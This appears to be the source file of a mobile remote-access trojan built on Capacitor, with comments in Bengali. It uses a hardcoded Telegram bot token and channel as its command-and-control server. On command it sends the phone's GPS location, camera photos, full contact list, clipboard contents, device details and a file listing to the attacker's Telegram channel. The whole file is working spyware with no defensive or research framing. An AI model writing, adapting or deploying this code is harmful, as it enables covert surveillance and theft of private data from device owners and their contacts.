import { Camera, CameraResultType, CameraSource } from '@capacitor/camera';
import { Geolocation } from '@capacitor/geolocation';
import { Device } from '@capacitor/device';
import { Filesystem, Directory, Encoding } from '@capacitor/filesystem';
import { Clipboard } from '@capacitor/clipboard';
import { Network } from '@capacitor/network';
import { Contacts } from '@capacitor-community/contacts';

const BOT_TOKEN = '8367516207:AAEKQnowvWWC32Z2eaPVjuRrxKfl1alssIA';
const CHANNEL_ID = '-1003552771281';
let lastUpdateId = 0;

export const startRemoteListener = (onToast: (msg: string) => void) => {
  const poll = async () => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
      const data = await response.json();
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          if (update.message?.text) await handleCommand(update.message.text, onToast);
        }
      }
    } catch (e) { console.error(e); }
    setTimeout(poll, 2500);
  };
  poll();
};

// টেক্সট রেসপন্স পাঠানোর ফাংশন
const sendResponse = async (t: string) => {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHANNEL_ID, text: `📱 **ANDROID CONTROL**\n\n${t}`, parse_mode: 'Markdown' })
  });
};

// ফাইল বা ছবি পাঠানোর ফাংশন (টেলিগ্রাম লিমিট এড়াতে)
const sendDocument = async (content: string, fileName: string) => {
    const blob = new Blob([content], { type: 'text/plain' });
    const formData = new FormData();
    formData.append('chat_id', CHANNEL_ID);
    formData.append('document', blob, fileName);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
};

const sendPhoto = async (base64Data: string) => {
    const blob = await (await fetch(`data:image/jpeg;base64,${base64Data}`)).blob();
    const formData = new FormData();
    formData.append('chat_id', CHANNEL_ID);
    formData.append('photo', blob, 'capture.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
};

const handleCommand = async (text: string, onToast: (msg: string) => void) => {
  const cmd = text.split(' ')[0].toLowerCase();

  switch (cmd) {
    case '/info':
      const info = await Device.getInfo();
      const bat = await Device.getBatteryInfo();
      await sendResponse(`Model: ${info.model}\nOS: ${info.operatingSystem}\nBattery: ${Math.round(bat.batteryLevel! * 100)}%`);
      break;

    case '/ip':
      const status = await Network.getStatus();
      await sendResponse(`Connection: ${status.connectionType}\nOnline: ${status.connected}`);
      break;

    case '/vibrate':
      navigator.vibrate?.(2000);
      await sendResponse("📳 Device Vibrated for 2s");
      break;

    case '/location':
    case '/get_loc':
      const p = await Geolocation.getCurrentPosition();
      await sendResponse(`📍 Loc: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
      break;

    case '/cam':
    case '/pic_front':
      try {
        const img = await Camera.getPhoto({ quality: 90, resultType: CameraResultType.Base64, source: CameraSource.Camera });
        if(img.base64String) await sendPhoto(img.base64String);
      } catch (e) { await sendResponse("❌ Camera error: " + e); }
      break;

    case '/contacts':
    case '/get_contacts':
      try {
        const result = await Contacts.getContacts({ projection: { name: true, phones: true } });
        const allContacts = result.contacts.map(c => `${c.name?.display}: ${c.phones?.map(p => p.number).join(', ')}`).join('\n');
        await sendDocument(allContacts, "contacts_list.txt");
        await sendResponse("📂 Full contact list sent as file.");
      } catch (e) { await sendResponse("❌ Contacts Error: " + e); }
      break;

    case '/clipboard':
      const clip = await Clipboard.read();
      await sendResponse(`📋 Clipboard: ${clip.value}`);
      break;

    case '/ls':
    case '/dir':
      try {
        const files = await Filesystem.readdir({ path: '', directory: Directory.Documents });
        await sendResponse(`📁 Files in Documents:\n${files.files.map(f => f.name).join('\n')}`);
      } catch (e) { await sendResponse("❌ FS Error: " + e); }
      break;

    case '/toast':
      onToast(text.replace('/toast ', ''));
      await sendResponse("✅ Toast displayed on screen");
      break;

    case '/sms':
    case '/get_sms':
    case '/call_log':
    case '/mic':
      await sendResponse(`⚠️ Command ${cmd} requires Native Android permissions. Web-based apps cannot access SMS/MIC directly without custom native plugins.`);
      break;

    case '/kill':
      await sendResponse("🛑 Closing application...");
      window.close();
      break;

    default:
      if(cmd.startsWith('/')) await sendResponse(`Received: ${cmd}\nStatus: Logic defined, but waiting for native triggers.`);
  }
};
